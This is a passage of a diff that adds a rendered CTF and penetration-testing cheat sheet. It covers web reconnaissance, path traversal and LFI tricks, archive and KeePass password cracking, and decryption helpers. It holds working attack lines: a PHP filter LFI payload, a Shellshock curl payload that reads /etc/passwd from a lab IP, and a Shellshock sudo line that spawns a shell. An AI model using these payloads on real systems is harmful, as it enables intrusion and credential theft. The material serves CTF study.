+<span class="c1">## Eugene &amp; Margo can SSH in, no-one else allowed</span>
+<span class="n">AllowUsers</span> <span class="n">example_user1</span> <span class="n">example_user2</span>
+<span class="c1">## SSH keys only but example_user1 can use a password</span>
+<span class="n">Match</span> <span class="n">user</span> <span class="n">example_user1</span>
+<span class="n">PasswordAuthentication</span> <span class="n">yes</span>
+<span class="c1">## End tighten security</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="http">
+<h2>HTTP<a class="headerlink" href="#http" title="Link to this heading"></a></h2>
+<section id="first-things">
+<h3>First things<a class="headerlink" href="#first-things" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>View Source of the web-page (Ctrl+U).</p></li>
+<li><p>Inspect element of the web-page (F12).</p></li>
+<li><p>See if there is any hint in the title of the web page. (example: /Magic).</p></li>
+<li><p>Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!</p></li>
+<li><p>Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.</p></li>
+<li><p>If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.</p></li>
+<li><p>If there’s a page where redirect is happening (for example, <a class="reference external" href="http://example.com">http://example.com</a> or <a class="reference external" href="http://example.com/support.php">http://example.com/support.php</a> redirects us to <a class="reference external" href="http://example.com/login.php">http://example.com/login.php</a>) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.</p></li>
+<li><p><a class="reference external" href="https://en.wikipedia.org/wiki/List_of_HTTP_header_fields">List of HTTP Headers</a> : Quite important when you want to set headers/ cookies etc.</p></li>
+<li><p>Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example:
+when browsing</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">SitePages</span><span class="o">/</span>
+</pre></div>
+</div>
+<p>it redirects to</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">_layouts</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="n">start</span><span class="o">.</span><span class="n">aspx</span><span class="c1">#/SitePages/Forms/AllPages.aspx</span>
+</pre></div>
+</div>
+<p>we may find something by adjusting the URL manually to</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IPAddress</span><span class="o">/</span><span class="n">SitePages</span><span class="o">/</span><span class="n">Forms</span><span class="o">/</span><span class="n">AllPages</span><span class="o">.</span><span class="n">aspx</span>
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+<section id="csc-austria-ctf-tips-and-tricks">
+<h3>CSC Austria: CTF Tips and Tricks<a class="headerlink" href="#csc-austria-ctf-tips-and-tricks" title="Link to this heading"></a></h3>
+<p>Refer <a class="reference external" href="https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf">SEC Consult – Cyber Security Challenge Austria /CTF Tips &amp; Tricks</a></p>
+<ul>
+<li><p>Read the source code / comments</p></li>
+<li><p>Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)</p></li>
+<li><p>Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)</p></li>
+<li><p>Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).</p></li>
+<li><p>Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.</p></li>
+<li><p>Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.</p></li>
+<li><p>Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF
+(Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.</p></li>
+<li><p>If you come across a technology which you don’t know, try to google security writeups for these technologies.</p></li>
+<li><p>Try special characters</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(‘, “, {, ;, |, &amp;&amp;, \, /, !(), %…)
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.</p>
+</div></blockquote>
+<ul>
+<li><p>To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).</p></li>
+<li><p>If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>“../”
+</pre></div>
+</div>
+</li>
+</ul>
+<blockquote>
+<div><p>with an empty string, you can try to bypass it by injecting the sequence two times, like:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>“…/./”.
+</pre></div>
+</div>
+<p>If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.</p>
+</div></blockquote>
+<ul class="simple">
+<li><p>If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it;
+with php-filter you can first base64-encode the content to display it):</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>index.php?filename=php://filter/convert.base64-encode/resource=index.php
+</pre></div>
+</div>
+</div></blockquote>
+</section>
+<section id="htaccess-useragent">
+<h3>htaccess - UserAgent<a class="headerlink" href="#htaccess-useragent" title="Link to this heading"></a></h3>
+<p>When you see something like this “Someone’s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content”. Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>cat .htaccess
+BrowserMatchNoCase &quot;iPhone&quot; allowed
+
+Order Deny,Allow
+Deny from ALL
+Allow from env=allowed
+ErrorDocument 403 “&lt;H1&gt;Super secret location - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;”
+</pre></div>
+</div>
+</section>
+<section id="cgi-bin-shellshock">
+<h3>CGI-BIN Shellshock<a class="headerlink" href="#cgi-bin-shellshock" title="Link to this heading"></a></h3>
+<p>To understand shellshock few blogs can be referred such as <a class="reference external" href="https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/">ShellShocked – A quick demo of how easy it is to exploit</a> , <a class="reference external" href="https://blog.cloudflare.com/inside-shellshock/">Inside Shellshock: How hackers are using it to exploit systems</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;User-Agent: () { :; }; echo &#39;Content-type: text/html&#39;; echo; /bin/cat /etc/passwd&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.56.2</span><span class="p">:</span><span class="mi">591</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="nb">bin</span><span class="o">/</span><span class="n">cat</span>
+</pre></div>
+</div>
+<p>It is important to understand what is cgi-bin which can be read from <a class="reference external" href="http://www.team2053.org/docs/bashcgi/gettingstarted.html">Creating CGI Programs with Bash: Getting Started</a> . Also the most important lines in this file are:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;Content-type: text/html&quot;</span>
+<span class="n">echo</span> <span class="s2">&quot;&quot;</span>
+</pre></div>
+</div>
+<p>These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn’t understand that it is HTML!</p>
+<p><strong>Shellshock Local Privilege Escalation</strong></p>
+<p>Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">PS1</span><span class="o">=</span><span class="s2">&quot;() { :;} ;  /bin/sh&quot;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">suidbinary</span>
+</pre></div>
+</div>
+<p>Shellshock also affects DHCP as mentioned <a class="reference external" href="https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/">Shellshock DHCP RCE Proof of Concept</a> There’s a metasploit module named “Dhclient Bash Environment Variable Injection (Shellshock)” for this.</p>
+</section>
+<section id="xss-html-injection">
+<h3>XSS/ HTML Injection<a class="headerlink" href="#xss-html-injection" title="Link to this heading"></a></h3>
+<p>The below will redirect the page to google.com</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;META http-equiv=“refresh” content=“0;URL=http://www.google.com”&gt;
+</pre></div>
+</div>
+</section>
+<section id="curl">
+<h3>curl<a class="headerlink" href="#curl" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>-k, --insecure
+(SSL) This option explicitly allows curl to perform &quot;insecure&quot; SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
+This makes all connections considered &quot;insecure&quot; fail unless -k, --insecure is used.
+
+-I, --head
+(HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.
+</pre></div>
+</div>
+</section>
+<section id="http-referer">
+<h3>HTTP Referer<a class="headerlink" href="#http-referer" title="Link to this heading"></a></h3>
+<p>The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Referer</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">An</span> <span class="n">absolute</span> <span class="ow">or</span> <span class="n">partial</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="n">previous</span> <span class="n">web</span> <span class="n">page</span> <span class="kn">from</span> <span class="nn">which</span> <span class="n">a</span> <span class="n">link</span> <span class="n">to</span> <span class="n">the</span> <span class="n">currently</span> <span class="n">requested</span> <span class="n">page</span> <span class="n">was</span> <span class="n">followed</span><span class="o">.</span> <span class="n">URL</span> <span class="n">fragments</span> <span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">e</span><span class="o">.</span> <span class="s2">&quot;#section&quot;</span><span class="p">)</span> <span class="n">are</span> <span class="ow">not</span> <span class="n">included</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+<section id="data-uri">
+<h3>Data-URI<a class="headerlink" href="#data-uri" title="Link to this heading"></a></h3>
+<p><a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">Basics of HTTP Data URI</a></p>
+</section>
+<section id="login-pages">
+<h3>Login-Pages<a class="headerlink" href="#login-pages" title="Link to this heading"></a></h3>
+<p>To test login pages, we may use burpsuite intruder and check for different length of response.</p>
+</section>
+<section id="delete-tags">
+<h3>Delete Tags<a class="headerlink" href="#delete-tags" title="Link to this heading"></a></h3>
+<p>Delete all lines between tags including tags:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sed</span> <span class="s1">&#39;/&lt;tag&gt;/,/&lt;\/tag&gt;/d&#39;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.</p>
+</div>
+</section>
+<section id="http-404-custom-page">
+<h3>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Link to this heading"></a></h3>
+<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored.</p>
+</section>
+</section>
+<section id="password-protected-file">
+<h2>Password Protected File<a class="headerlink" href="#password-protected-file" title="Link to this heading"></a></h2>
+<section id="zip-file">
+<h3>ZIP File<a class="headerlink" href="#zip-file" title="Link to this heading"></a></h3>
+<p>run fcrackzip</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">fcrackzip</span> <span class="o">-</span><span class="n">D</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">p</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">rockyou2</span><span class="o">.</span><span class="n">txt</span> <span class="n">flag</span><span class="o">.</span><span class="n">zip</span>
+
+<span class="o">-</span><span class="n">D</span><span class="p">,</span> <span class="o">--</span><span class="n">dictionary</span><span class="p">:</span>    <span class="n">Select</span> <span class="n">dictionary</span> <span class="n">mode</span><span class="o">.</span> <span class="n">In</span> <span class="n">this</span> <span class="n">mode</span><span class="p">,</span> <span class="n">fcrackzip</span> <span class="n">will</span> <span class="n">read</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">file</span><span class="p">,</span> <span class="n">which</span> <span class="n">must</span> <span class="n">contain</span> <span class="n">one</span> <span class="n">password</span> <span class="n">per</span> <span class="n">line</span> <span class="ow">and</span> <span class="n">should</span> <span class="n">be</span> <span class="n">alphabetically</span> <span class="nb">sorted</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="n">using</span> <span class="n">sort</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span>
+<span class="o">-</span><span class="n">p</span><span class="p">,</span> <span class="o">--</span><span class="n">init</span><span class="o">-</span><span class="n">password</span> <span class="n">string</span> <span class="p">:</span>  <span class="n">Set</span> <span class="n">initial</span> <span class="p">(</span><span class="n">starting</span><span class="p">)</span> <span class="n">password</span> <span class="k">for</span> <span class="n">brute</span><span class="o">-</span><span class="n">force</span> <span class="n">searching</span> <span class="n">to</span> <span class="n">string</span><span class="p">,</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">the</span> <span class="n">file</span> <span class="k">with</span> <span class="n">the</span> <span class="n">name</span> <span class="n">string</span> <span class="n">to</span> <span class="n">supply</span> <span class="n">passwords</span> <span class="k">for</span> <span class="n">dictionary</span> <span class="n">searching</span><span class="o">.</span>
+<span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="o">--</span><span class="n">use</span><span class="o">-</span><span class="n">unzip</span><span class="p">:</span> <span class="n">Try</span> <span class="n">to</span> <span class="n">decompress</span> <span class="n">the</span> <span class="n">first</span> <span class="n">file</span> <span class="n">by</span> <span class="n">calling</span> <span class="n">unzip</span> <span class="k">with</span> <span class="n">the</span> <span class="n">guessed</span> <span class="n">password</span><span class="o">.</span> <span class="n">This</span> <span class="n">weeds</span> <span class="n">out</span> <span class="n">false</span> <span class="n">positives</span> <span class="n">when</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">files</span> <span class="n">have</span> <span class="n">been</span> <span class="n">given</span><span class="o">.</span>
+</pre></div>
+</div>
+</section>
+<section id="rar2john">
+<h3>rar2john<a class="headerlink" href="#rar2john" title="Link to this heading"></a></h3>
+<p>We can get the password hash of a password protected rar file by using rar2john</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[root:~/Downloads]# rar2john crocs.rar
+file name: artwork.jpg
+crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg
+</pre></div>
+</div>
+</section>
+<section id="keepass2john">
+<h3>keepass2john<a class="headerlink" href="#keepass2john" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>keepass2john user.kdbx
+user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">john</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="nb">format</span><span class="o">=</span><span class="n">keepass</span> <span class="n">hashfile</span>
+</pre></div>
+</div>
+<p>There are other *2john thingy</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dmg2john</span>
+<span class="n">gpg2john</span>
+<span class="n">hccap2john</span>
+<span class="n">keepass2john</span>
+<span class="n">keychain2john</span>
+<span class="n">keyring2john</span>
+<span class="n">keystore2john</span>
+<span class="n">kwallet2john</span>
+<span class="n">luks2john</span>
+<span class="n">pfx2john</span>
+<span class="n">putty2john</span>
+<span class="n">pwsafe2john</span>
+<span class="n">racf2john</span>
+<span class="n">rar2john</span>
+<span class="n">ssh2john</span>
+<span class="n">truecrypt_volume2john</span>
+<span class="n">uaf2john</span>
+<span class="n">wpapcap2john</span>
+<span class="n">zip2john</span>
+<span class="mi">7</span><span class="n">z2john</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="encrypted-files">
+<h2>Encrypted Files<a class="headerlink" href="#encrypted-files" title="Link to this heading"></a></h2>
+<p>Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption</p>
+<section id="symmetric-key">
+<h3>Symmetric Key<a class="headerlink" href="#symmetric-key" title="Link to this heading"></a></h3>
+<p>If we have the encrypted file and the key to it. However, we don’t know the encryption scheme such as aes-128-cbc, des-cbc.</p>
+<p>We can use the code written by superkojiman in <a class="reference external" href="https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/">De-ICE Hacking Challenge Part-1</a> , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ciphers=`openssl list-cipher-commands`
+for i in $ciphers; do
+ openssl enc -d -${i} -in &lt;encrypted-file&gt; -k &lt;password/ keyfile&gt; &gt; /dev/null 2&gt;&amp;1
+ if [[ $? -eq 0 ]]; then
+  echo &quot;Cipher is $i: openssl enc -d -${i} -in &lt;encrypted-file&gt; -k &lt;password/ keyfile&gt; -out foo.txt&quot;
+  exit
+ fi
+done
+</pre></div>
+</div>
+</section>
+<section id="rsa-public-private-key-encryption">
+<h3>RSA Public-Private Key encryption<a class="headerlink" href="#rsa-public-private-key-encryption" title="Link to this heading"></a></h3>
+<p>If we have found a weak RSA public, we can use <a class="reference external" href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a> uncipher data from weak public key and try to recover private key and then use</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">openssl</span> <span class="n">rsautl</span> <span class="o">-</span><span class="n">decrypt</span> <span class="o">-</span><span class="n">inkey</span> <span class="n">privatekey</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="ow">in</span> <span class="o">&lt;</span><span class="n">encryptedfile</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">out</span> <span class="n">key</span><span class="o">.</span><span class="n">bin</span>
+</pre></div>
+</div>
+<p>The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">5e14</span><span class="n">f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a</span>
+</pre></div>
+</div>
+<p>Convert it in to binary using</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="n">ciphertext</span> <span class="o">&gt;</span> <span class="n">ciphertext3</span>
+</pre></div>
+</div>
+</section>
+<section id="rsa-given-q-p-and-e">
+<h3>RSA given q, p and e?<a class="headerlink" href="#rsa-given-q-p-and-e" title="Link to this heading"></a></h3>
+<p>Taken from <a class="reference external" href="https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e">RSA Given q,p and e</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+   <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span>
+   <span class="k">while</span> <span class="n">a</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+       <span class="n">q</span><span class="p">,</span> <span class="n">r</span> <span class="o">=</span> <span class="n">b</span><span class="o">//</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="o">%</span><span class="n">a</span>
+       <span class="n">m</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">x</span><span class="o">-</span><span class="n">u</span><span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="n">y</span><span class="o">-</span><span class="n">v</span><span class="o">*</span><span class="n">q</span>
+       <span class="n">b</span><span class="p">,</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span> <span class="o">=</span> <span class="n">a</span><span class="p">,</span><span class="n">r</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span><span class="n">v</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span><span class="n">n</span>
+       <span class="n">gcd</span> <span class="o">=</span> <span class="n">b</span>
+   <span class="k">return</span> <span class="n">gcd</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+   <span class="n">p</span> <span class="o">=</span> <span class="mi">1090660992520643446103273789680343</span>
+   <span class="n">q</span> <span class="o">=</span> <span class="mi">1162435056374824133712043309728653</span>
+   <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+   <span class="n">ct</span> <span class="o">=</span> <span class="mi">299604539773691895576847697095098784338054746292313044353582078965</span>
+
+   <span class="c1"># compute n</span>
+   <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+
+   <span class="c1"># Compute phi(n)</span>
+   <span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+   <span class="c1"># Compute modular inverse of e</span>
+   <span class="n">gcd</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+   <span class="n">d</span> <span class="o">=</span> <span class="n">a</span>
+
+   <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;n:  &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="p">);</span>
+
+   <span class="c1"># Decrypt ciphertext</span>
+   <span class="n">pt</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">ct</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+   <span class="nb">print</span><span class="p">(</span> <span class="s2">&quot;pt: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span> <span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+   <span class="n">main</span><span class="p">()</span>
+</pre></div>
+</div>
+</section>
+<section id="seccure-elliptic-curve-crypto-utility-for-reliable-encryption">
+<h3>SECCURE Elliptic Curve Crypto Utility for Reliable Encryption<a class="headerlink" href="#seccure-elliptic-curve-crypto-utility-for-reliable-encryption" title="Link to this heading"></a></h3>
+<p>If you see, something like this</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s1">&#39;</span><span class="se">\x00\x14</span><span class="s1">6</span><span class="se">\x17\xe9\xc1\x1a\x7f</span><span class="s1">kX</span><span class="se">\xec\xa0</span><span class="s1">n,h</span><span class="se">\xb4\xd0\x98\xea</span><span class="s1">O[</span><span class="se">\xf8\xfa\x85\xaa\xb3</span><span class="s1">7!</span><span class="se">\xf0</span><span class="s1">j</span><span class="se">\x0e\xd4\xd0\x8b\xfe</span><span class="s1">}</span><span class="se">\x8a\xd2</span><span class="s1">+</span><span class="se">\xf2\xce</span><span class="s1">u</span><span class="se">\x07\x90</span><span class="s1">K2E</span><span class="se">\x12\x1d\xf1\xd8\x8f\xc6\x91\t</span><span class="s1">&lt;w</span><span class="se">\x99\x1b</span><span class="s1">9</span><span class="se">\x98</span><span class="s1">&#39;</span>
+</pre></div>
+</div>
+<p>it’s probably <a class="reference external" href="http://point-at-infinity.org/seccure/">SECCURE Elliptic Curve Crypto Utility for Reliable Encryption</a> Utilize python module <a class="reference external" href="https://pypi.python.org/pypi/seccure">seccure</a> to get the plaintext.</p>
+</section>
+<section id="gpg">
+<h3>GPG<a class="headerlink" href="#gpg" title="Link to this heading"></a></h3>
+<p>Where are the GPG Keys stored?</p>
+<p>By default in ~/.gnupg/ and can be found using</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gpg</span> <span class="o">-</span><span class="n">K</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="network-information">
+<h2>Network Information<a class="headerlink" href="#network-information" title="Link to this heading"></a></h2>
+<p>Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?</p>
+<section id="ip">
+<h3>ip<a class="headerlink" href="#ip" title="Link to this heading"></a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ip</span> <span class="n">addr</span>
+
+ <span class="mi">1</span><span class="p">:</span> <span class="n">lo</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">LOOPBACK</span><span class="p">,</span><span class="n">UP</span><span class="p">,</span><span class="n">LOWER_UP</span><span class="o">&gt;</span> <span class="n">mtu</span> <span class="mi">65536</span> <span class="n">qdisc</span> <span class="n">noqueue</span> <span class="n">state</span> <span class="n">UNKNOWN</span> <span class="n">group</span> <span class="n">default</span> <span class="n">qlen</span> <span class="mi">1000</span>
+  <span class="n">link</span><span class="o">/</span><span class="n">loopback</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">brd</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+  <span class="n">inet</span> <span class="mf">127.0.0.1</span><span class="o">/</span><span class="mi">8</span> <span class="n">scope</span> <span class="n">host</span> <span class="n">lo</span>
+     <span class="n">valid_lft</span> <span class="n">forever</span> <span class="n">preferred_lft</span> <span class="n">forever</span>
+ <span class="mi">17</span><span class="p">:</span> <span class="n">wwan0</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">BROADCAST</span><span class="p">,</span><span class="n">MULTICAST</span><span class="p">,</span><span class="n">UP</span><span class="p">,</span><span class="n">LOWER_UP</span><span class="o">&gt;</span> <span class="n">mtu</span> <span class="mi">1500</span> <span class="n">qdisc</span> <span class="n">pfifo_fast</span> <span class="n">state</span> <span class="n">UNKNOWN</span> <span class="n">group</span> <span class="n">default</span> <span class="n">qlen</span> <span class="mi">1000</span>
+    <span class="n">link</span><span class="o">/</span><span class="n">ether</span> <span class="n">b2</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="n">c6</span> <span class="n">brd</span> <span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span>
+   <span class="n">inet</span> <span class="mf">14.97.194.148</span><span class="o">/</span><span class="mi">30</span> <span class="n">brd</span> <span class="mf">14.97.194.151</span> <span class="n">scope</span> <span class="k">global</span> <span class="n">dynamic</span> <span class="n">noprefixroute</span> <span class="n">wwan0</span>
+     <span class="n">valid_lft</span> <span class="mi">5222</span><span class="n">sec</span> <span class="n">preferred_lft</span> <span class="mi">5222</span><span class="n">sec</span>
+</pre></div>
+</div>
+</section>
+<section id="hostname">
